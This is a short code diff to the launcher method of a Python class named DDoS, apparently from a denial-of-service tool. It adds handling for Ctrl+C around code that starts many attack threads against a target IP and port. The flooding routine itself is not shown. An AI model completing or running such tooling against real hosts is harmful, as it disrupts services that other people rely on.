@@ -130,22 +130,23 @@ class DDoS(object):
 
     def startAttack(self):
 
-        colors.info('DDoS Attack on : {} : {}'.format(self.target_ip, self.dport))
+        try:
+            colors.info('DDoS Attack on : {} : {}'.format(self.target_ip, self.dport))
 
-        colors.success('DDoS Attack started, press CTRL+C to stop...')
+            colors.success('DDoS Attack started, press CTRL+C to stop...')
 
-        t1 = time.time()
+            t1 = time.time()
 
-        threads = []
+            threads = []
 
-        for _ in range(self.threads):
-            newThread = threading.Thread(target=self.attack)
-            threads.append(newThread)
-            newThread.start()
+            for _ in range(self.threads):
+                newThread = threading.Thread(target=self.attack)
+                threads.append(newThread)
+                newThread.start()
 
-        for thread in threads:
-            thread.join()
+            for thread in threads:
+                thread.join()
 
-        t2 = time.time()
-
-        colors.success('Completed in time : {}'.format(t2-t1))
+        except KeyboardInterrupt:
+            t2 = time.time()
+            colors.success('Completed in time : {}'.format(t2-t1))
